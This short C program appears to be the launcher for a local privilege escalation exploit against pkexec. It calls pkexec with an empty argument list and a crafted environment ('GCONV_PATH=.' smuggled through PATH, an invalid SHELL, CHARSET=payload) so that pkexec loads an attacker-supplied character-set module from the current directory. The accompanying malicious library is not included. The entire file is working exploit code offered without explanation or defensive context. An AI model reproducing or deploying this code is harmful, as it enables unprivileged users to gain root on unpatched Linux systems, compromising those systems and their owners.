#include <stdlib.h>
#include <unistd.h>

int main() {
	char* new_argv[] = { NULL };
	char* new_envp[] = { "payload", "PATH=GCONV_PATH=.", "SHELL=random_string_thats_not_present_in_/etc/shells", "CHARSET=payload", NULL };
	execve("/usr/bin/pkexec", new_argv, new_envp);
	return 0;
}
